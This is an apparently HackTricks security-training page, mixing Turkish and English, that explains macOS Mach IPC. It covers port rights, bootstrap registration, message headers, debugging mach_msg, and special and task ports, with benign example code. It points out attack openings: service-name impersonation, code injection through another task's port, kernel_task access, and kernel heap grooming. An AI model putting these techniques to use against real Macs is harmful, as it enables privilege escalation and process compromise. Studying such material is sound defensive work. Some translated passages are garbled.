# macOS IPC - Süreçler Arası İletişim

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Temel Bilgiler

Mach, kaynakları paylaşmak için **tasks**'ı **en küçük birim** olarak kullanır ve her task birden fazla **threads** içerebilir. Bu **tasks ve threads POSIX processes ve threads ile 1:1 eşlenir**.

Task'lar arasındaki iletişim, tek yönlü iletişim kanalları kullanan Mach Inter-Process Communication (IPC) aracılığıyla gerçekleşir. **Mesajlar, kernel tarafından yönetilen bir tür mesaj kuyruğu gibi davranan ports arasında iletilir.**

Bir **port**, Mach IPC'nin **temel** öğesidir. Hem **mesaj göndermek hem de almak** için kullanılabilir.

Her process'in bir **IPC tablosu** vardır; burada o process'in **mach port'ları** bulunabilir. Bir mach port'un adı aslında bir sayıdır (kernel nesnesine işaretçi).

Bir process ayrıca bir port adını bazı haklarla birlikte **farklı bir task'a** da gönderebilir ve kernel bu girişin diğer task'ın **IPC tablosunda** görünmesini sağlar.

### Port Rights

Bir task'ın hangi işlemleri yapabileceğini tanımlayan port hakları, bu iletişim için anahtardır. Olası **port rights** şunlardır ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, porta gönderilen mesajları almaya izin verir. Mach port'lar MPSC (multiple-producer, single-consumer) kuyruklarıdır; bu da tüm sistemde her port için yalnızca **bir Receive right** bulunabileceği anlamına gelir (pipe'larda olduğu gibi birden fazla process aynı pipe'ın read ucuna sahip olamaz).
- **Receive** hakkına sahip bir task mesajları alabilir ve **Send right** oluşturabilir; bu sayede mesaj gönderebilir. Başlangıçta sadece **kendi task'ı kendi port'u üzerinde Receive right'a** sahiptir.
- Eğer Receive hakkının sahibi **ölür** veya hakkı iptal ederse, **send right işe yaramaz hale gelir (dead name).**
- **Send right**, porta mesaj göndermeye izin verir.
- Send right **klonlanabilir**, böylece bir Send right'a sahip task bu hakkı klonlayıp **üçüncü bir task'a verebilir**.
- Unutmayın ki **port rights** Mac mesajları aracılığıyla **geçirilebilir**.
- **Send-once right**, porta bir mesaj göndermeye izin verir ve sonra yok olur.
- Bu hak **klonlanamaz**, ancak **taşınabilir**.
- **Port set right**, tek bir port yerine bir _port set'i_ belirtir. Bir port set'ten mesaj çıkarmak, içinde bulunan port'lardan birinden mesaj çıkarır. Port set'ler birden fazla port'u aynı anda dinlemek için kullanılabilir; Unix'teki `select`/`poll`/`epoll`/`kqueue` gibidir.
- **Dead name**, aslında gerçek bir port hakkı değildir, sadece bir yer tutucudur. Bir port yok edildiğinde, porta ait tüm mevcut port hakları dead name'e dönüşür.

**Tasks SEND haklarını başkalarına aktarabilir**, onlara geri mesaj göndermelerini sağlamak için. **SEND hakları klonlanabilir, böylece bir task hakkı çoğaltıp üçüncü bir task'a verebilir.** Bu, bootstrap server olarak bilinen aracı bir process ile birleştiğinde, task'lar arasında etkili iletişime izin verir.

### File Ports

File ports, file descriptor'ları Mac port'ları içinde kapsüllemeye izin verir (Mach port hakları kullanarak). Bir FD'den `fileport_makeport` ile bir `fileport` oluşturmak ve bir fileport'tan FD oluşturmak için `fileport_makefd` kullanmak mümkündür.

### İletişimin Kurulması

Daha önce belirtildiği gibi, Mach mesajları kullanılarak haklar gönderilebilir, ancak bir Mach mesajı göndermek için zaten bir hak sahibi olmadan bir hakkı **göndemezsiniz**. Peki ilk iletişim nasıl kurulur?

Bunun için **bootstrap server** (mac'te **launchd**), herkesin bootstrap server'a bir SEND right alabileceği için devreye girer; başka bir process'e mesaj göndermek için bir hak talep etmek mümkündür:

1. Task **A** yeni bir **port** oluşturur ve üzerinde **RECEIVE right** elde eder.
2. RECEIVE hakkının sahibi olan Task **A**, port için bir **SEND right** oluşturur.
3. Task **A**, **bootstrap server** ile bir bağlantı kurar ve başlangıçta oluşturduğu port için **SEND right**'ı **bootstrap server'a gönderir**.
- Unutmayın ki herkes bootstrap server'a bir SEND right alabilir.
4. Task A, bootstrap server'a `bootstrap_register` mesajı göndererek verilen port'u `com.apple.taska` gibi bir isimle **ilişkilendirir**.
5. Task **B**, servis adına yönelik bir bootstrap **lookup** (`bootstrap_lookup`) yapmak için **bootstrap server** ile etkileşir. Bootstrap server yanıt verebilmesi için, Task B lookup mesajı içinde daha önce oluşturduğu bir porta ait **SEND right**'ı gönderecektir. Eğer lookup başarılı olursa, **server Task A'dan aldığı SEND right'ı çoğaltır ve Task B'ye iletir.**
- Unutmayın ki herkes bootstrap server'a bir SEND right alabilir.
6. Bu SEND right ile **Task B**, **Task A'ya** **mesaj gönderebilir.**
7. İki yönlü iletişim için genelde Task **B** yeni bir port oluşturur (bir **RECEIVE** ve bir **SEND** right) ve **SEND right'ı Task A'ya verir** ki Task A TASK B'ye mesaj gönderebilsin (iki yönlü iletişim).

Bootstrap server, bir task'ın iddia ettiği servis adını doğrulayamaz. Bu, bir task'ın potansiyel olarak herhangi bir sistem task'ı taklit edebileceği (ör. yanlışlıkla bir authorization service adı iddia edip her isteği onaylama) anlamına gelir.

Apple, sistem tarafından sağlanan servis isimlerini SIP-protected dizinlerdeki güvenli konfigürasyon dosyalarında saklar: /System/Library/LaunchDaemons ve /System/Library/LaunchAgents. Her servis adıyla birlikte ilişkili ikili dosya da saklanır. Bootstrap server, bu servis isimlerinin her biri için bir **RECEIVE right** oluşturur ve tutar.

Bu önceden tanımlanmış servisler için lookup süreci biraz farklıdır. Bir servis adı lookup edilirken, launchd servisi dinamik olarak başlatır. Yeni iş akışı şu şekildedir:

- Task **B** bir servis adı için bootstrap **lookup** başlatır.
- **launchd**, servisin çalışıp çalışmadığını kontrol eder; çalışmıyorsa **başlatır**.
- Task **A** (servis) bir **bootstrap check-in** (`bootstrap_check_in()`) yapar. Burada, **bootstrap** server bir SEND right oluşturur, onu tutar ve **RECEIVE right'ı Task A'ya** transfer eder.
- launchd **SEND right'ı çoğaltır ve Task B'ye gönderir.**
- Task **B**, bir **RECEIVE** ve bir **SEND** right içeren yeni bir port oluşturur ve **SEND right'ı Task A'ya** (svc) verir, böylece Task A TASK B'ye mesaj gönderebilir (iki yönlü iletişim).

Ancak bu süreç yalnızca önceden tanımlanmış sistem task'ları için geçerlidir. Sistem dışı task'lar hâlâ orijinal şekilde çalışır; bu da taklit (impersonation) olasılığını doğurur.

> [!CAUTION]
> Bu nedenle, launchd asla çökmemelidir yoksa tüm sistem çöker.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` fonksiyonu, temelde bir system call, Mach mesajları göndermek ve almak için kullanılır. Fonksiyon, gönderilecek mesajı ilk argüman olarak gerektirir. Bu mesaj bir `mach_msg_header_t` yapısıyla başlamalı ve ardından gerçek mesaj içeriği gelmelidir. Yapı şu şekilde tanımlanır:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Süreçler Mach port üzerinde mesaj alabilen _**receive right**_'a sahiptir. Tersine, **senders**'a _**send**_ veya _**send-once right**_ verilir. Send-once right yalnızca tek bir mesaj göndermek içindir; gönderildikten sonra geçersiz olur.

Başlangıç alanı **`msgh_bits`** bir bit haritasıdır:

- İlk bit (en anlamlı) bir mesajın karmaşık olduğunu göstermek için kullanılır (aşağıda daha fazlası)
- 3. ve 4. bitler çekirdek tarafından kullanılır
- **2. baytın en az anlamlı 5 biti** **voucher** için kullanılabilir: anahtar/değer kombinasyonları göndermek için başka bir port türü.
- **3. baytın en az anlamlı 5 biti** **local port** için kullanılabilir
- **4. baytın en az anlamlı 5 biti** **remote port** için kullanılabilir

Voucher, local ve remote portlarda belirtilebilecek türler şunlardır (kaynak: [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

> [!TIP]
> Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.

The other fields of the message header are:

- `msgh_size`: the size of the entire packet.
- `msgh_remote_port`: the port on which this message is sent.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: the ID of this message, which is interpreted by the receiver.

> [!CAUTION]
> Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

#### Complex Messages

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32bits, all the descriptors are 12B and the descriptor type is in the 11th one. In 64 bits, the sizes vary.

> [!CAUTION]
> The kernel will copy the descriptors from one task to the other but first **creating a copy in kernel memory**. This technique, known as "Feng Shui" has been abused in several exploits to make the **kernel copy data in its memory** making a process send descriptors to itself. Then the process can receive the messages (the kernel will free them).
>
> It's also possible to **send port rights to a vulnerable process**, and the port rights will just appear in the process (even if he isn't handling them).

### Mac Ports APIs

Portların task isim alanıyla ilişkilendirildiğini unutmayın; bu yüzden bir port oluşturmak veya aramak için task isim alanı da sorgulanır (daha fazla bilgi `mach/mach_port.h` içinde):

- **`mach_port_allocate` | `mach_port_construct`**: **Bir port oluşturur.**
- `mach_port_allocate` ayrıca bir **port set** oluşturabilir: bir grup port üzerinde bir receive hakkı. Bir mesaj alındığında hangi porttan geldiği belirtilir.
- `mach_port_allocate_name`: Portun adını değiştirir (varsayılan olarak 32bit tamsayı)
- `mach_port_names`: Hedeften port adlarını alır
- `mach_port_type`: Bir ad üzerindeki bir task'in haklarını alır
- `mach_port_rename`: Bir portun adını değiştirir (FD'ler için dup2 gibi)
- `mach_port_allocate`: Yeni bir RECEIVE, PORT_SET veya DEAD_NAME tahsis eder
- `mach_port_insert_right`: RECEIVE hakkına sahip olduğunuz bir porta yeni bir hak oluşturur
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: mach mesajlarını **göndermek ve almak** için kullanılan fonksiyonlar. Overwrite versiyonu mesaj alımı için farklı bir buffer belirtmeye izin verir (diğer versiyon sadece mevcut buffer'ı yeniden kullanır).

### Debug mach_msg

Mesaj göndermek ve almak için kullanılan fonksiyonlar **`mach_msg`** ve **`mach_msg_overwrite`** olduğundan, bunlara breakpoint koymak gönderilen ve alınan mesajları incelemeyi sağlar.

Örneğin hata ayıklayabildiğiniz herhangi bir uygulamayı başlatın; bu uygulama **`libSystem.B`'yi yükleyecek ve bu fonksiyonu kullanacaktır**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

To get the arguments of **`mach_msg`** check the registers. These are the arguments (from [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Kayıt defterlerindeki değerleri alın:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
İlk argümanı kontrol ederek mesaj başlığını inceleyin:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Bu tür `mach_msg_bits_t` genellikle yanıt verilmesine izin vermek için kullanılır.

### Portları listeleme
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
The **isim** port'a verilen varsayılan addır (ilk 3 baytta nasıl **artan** olduğunu kontrol edin). The **`ipc-object`** is the **karartılmış** unique **tanımlayıcısı** of the port.\
Ayrıca sadece **`send`** hakkına sahip portların onun **sahibini belirlediğini** (port name + pid) not edin.\
Ayrıca **`+`** kullanımının **aynı port'a bağlı diğer görevleri** göstermek için olduğunu da not edin.

Ayrıca [**procesxp**](https://www.newosxbook.com/tools/procexp.html) kullanarak **kayıtlı servis isimlerini** görmek de mümkündür ( `com.apple.system-task-port` gerektiğinden SIP devre dışı bırakılmalıdır ):
```
procesp 1 ports
```
Bu aracı iOS'a [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) adresinden indirerek kurabilirsiniz.

### Kod örneği

Aşağıda **sender**'ın bir port **allocates** ettiğini, `org.darlinghq.example` adı için bir **send right** oluşturup bunu **bootstrap server**'a gönderdiğini; aynı zamanda **sender**'ın o isim için **send right** istediğini ve bunu **send a message** için kullandığını görebilirsiniz.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Ayrıcalıklı Portlar

Bazı özel portlar vardır; bir task bu portlar üzerinde **SEND** izinlerine sahipse **belirli hassas eylemleri gerçekleştirebilir veya belirli hassas verilere erişebilir**. Bu, bu portları saldırgan bakış açısından yalnızca yetenekleri yüzünden değil, aynı zamanda **SEND izinlerinin task'lar arasında paylaşılabiliyor olması** nedeniyle de çok ilginç kılar.

### Host Özel Portları

Bu portlar bir sayı ile temsil edilir.

**SEND** hakları **`host_get_special_port`** çağrılarak, **RECEIVE** hakları ise **`host_set_special_port`** çağrılarak edinilebilir. Ancak her iki çağrı da yalnızca root'un erişebildiği **`host_priv`** portunu gerektirir. Ayrıca geçmişte root, **`host_set_special_port`** çağrısı yaparak rastgele portları ele geçirebiliyor ve örneğin `HOST_KEXTD_PORT`'u ele geçirerek kod imzalarını baypas edebiliyordu (SIP artık bunu engelliyor).

Bunlar 2 gruba ayrılır: **ilk 7 port kernel'e aittir**; bunlar 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` ve 7 `HOST_MAX_SPECIAL_KERNEL_PORT`'dur.\
Numara **8'den** başlayanlar **system daemon**'larına aittir ve [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) içinde tanımları bulunur.

- **Host port**: Eğer bir process bu port üzerinde **SEND** ayrıcalığına sahipse, aşağıdaki gibi rutinleri çağırarak **sistem** hakkında **bilgi** alabilir:
- `host_processor_info`: İşlemci bilgisi alır
- `host_info`: Host bilgisi alır
- `host_virtual_physical_table_info`: Sanal/Fiziksel sayfa tablosu (gerektirir MACH_VMDEBUG)
- `host_statistics`: Host istatistiklerini alır
- `mach_memory_info`: Çekirdek bellek düzenini alır
- **Host Priv port**: Bu port üzerinde **SEND** hakkı olan bir process, boot verilerini gösterme veya bir kernel extension yüklemeyi deneme gibi **ayrıcalıklı eylemler** gerçekleştirebilir. Bu izni almak için **process'in root olması gerekir**.
- Ayrıca, **`kext_request`** API'sini çağırmak için yalnızca Apple ikili dosyalarına verilen başka entitlements olan **`com.apple.private.kext*`** gerekir.
- Çağrılabilecek diğer rutinler şunlardır:
- `host_get_boot_info`: `machine_boot_info()` alır
- `host_priv_statistics`: Ayrıcalıklı istatistikleri alır
- `vm_allocate_cpm`: Bitişik Fiziksel Bellek tahsis eder
- `host_processors`: Host processors'a SEND hakkı verir
- `mach_vm_wire`: Belleği resident yapar
- Root bu izne erişebildiği için, `host_set_[special/exception]_port[s]` çağrısını yaparak host özel veya exception portlarını ele geçirebilir.

Tüm host özel portlarını görmek için şunu çalıştırmak mümkündür:
```bash
procexp all ports | grep "HSP"
```
### Task Özel Portları

Bunlar iyi bilinen servisler için ayrılmış portlardır. Onları almak/ayarlamak için `task_[get/set]_special_port` çağrısını kullanabilirsiniz. Bunlar `task_special_ports.h` içinde bulunabilir:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Bu görevi kontrol etmek için kullanılan port. Göreve etki eden mesajları göndermek için kullanılır. Bu, **mach_task_self (see Task Ports below)** tarafından döndürülen porttur.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Görevin bootstrap portu. Diğer sistem servis portlarının geri verilmesini talep eden mesajları göndermek için kullanılır.
- **TASK_HOST_NAME_PORT**\[host-self send right]: İçinde bulunduğu host hakkında bilgi talep etmek için kullanılan port. Bu, **mach_host_self** tarafından döndürülen porttur.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Bu görevin wired kernel belleğini çektiği kaynağı adlandıran port.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Bu görevin varsayılan yönetilen belleğini çektiği kaynağı adlandıran port.

### Task Ports

Başlangıçta Mach'ın "process"leri yoktu; "task"ları vardı ve bunlar thread'lerin konteyneri gibi kabul ediliyordu. Mach BSD ile birleştirildiğinde **her task bir BSD process ile ilişkilendirildi**. Bu nedenle her BSD process bir process olmak için gereken detaylara sahiptir ve her Mach task da kendi iç işleyişine sahiptir (mevcut olmayan pid 0 olan `kernel_task` hariç).

Bununla ilgili iki çok ilginç fonksiyon vardır:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Belirtilen `pid` ile ilişkili task'ın task portu için bir SEND right alır ve bunu belirtilen `target_task_port`a verir (genelde çağıran task olup `mach_task_self()` kullanılmıştır, ancak farklı bir task üzerinde bir SEND portu da olabilir).
- `pid_for_task(task, &pid)`: Bir task'a verilen SEND right sayesinde, bu task'ın hangi PID ile ilişkili olduğunu bulur.

Task içinde eylemler gerçekleştirebilmek için, task kendisine `mach_task_self()` çağırarak bir `SEND` hakkı almalıdır (bu `task_self_trap` (28) kullanır). Bu izin ile bir task çeşitli işlemleri gerçekleştirebilir, örneğin:

- `task_threads`: Task'ın thread'lerinin tüm task portları üzerinde SEND right alır
- `task_info`: Bir task hakkında bilgi alır
- `task_suspend/resume`: Bir task'ı askıya alır veya devam ettirir
- `task_[get/set]_special_port`
- `thread_create`: Bir thread oluşturur
- `task_[get/set]_state`: Task durumunu kontrol eder
- ve daha fazlası [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) içinde bulunabilir

> [!CAUTION]
> Farklı bir task'ın task portu üzerinde bir SEND right sahibi olmak, aynı eylemlerin o farklı task üzerinde yapılabilmesine izin verir.

Ayrıca, task_port aynı zamanda `vm_map` portudur ve `vm_read()` ve `vm_write()` gibi fonksiyonlarla bir task içindeki belleği okumaya ve manipüle etmeye izin verir. Bu temelde, farklı bir task'ın task_portu üzerinde SEND haklarına sahip bir task'ın, o task'a kod inject edebileceği anlamına gelir.

Unutmayın ki **kernel de bir task olduğu** için, eğer birisi **`kernel_task`** üzerinde **SEND izinleri** elde ederse, kernel'in istediği her şeyi çalıştırmasını sağlayabilir (jailbreaks).

- Çağıran task için bu portun adını almak üzere `mach_task_self()` çağrılır. Bu port yalnızca `exec()` sırasında **miras alınır**; `fork()` ile oluşturulan yeni bir task yeni bir task portu alır (özel bir durum olarak, suid bir binary'de `exec()` sonrası bir task da yeni bir task portu alır). Bir task başlatıp portunu almak için `fork()` yaparken ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) yapılması tek yoldur.
- Porta erişim için kısıtlamalar şunlardır (`macos_task_policy` içinde, ikili `AppleMobileFileIntegrity`'den):
- Eğer uygulamanın **`com.apple.security.get-task-allow` entitlement**'ı varsa aynı kullanıcıdan gelen süreçler task portuna erişebilir (genelde debugging için Xcode tarafından eklenir). **notarization** süreci bunu üretim sürümlerine izin vermez.
- **`com.apple.system-task-ports`** entitlement'ı olan uygulamalar kernel hariç herhangi bir process için task portunu alabilir. Eski sürümlerde buna **`task_for_pid-allow`** deniyordu. Bu sadece Apple uygulamalarına verilir.
- **root**, hardened runtime ile derlenmemiş (ve Apple'a ait olmayan) uygulamaların task portlarına erişebilir.

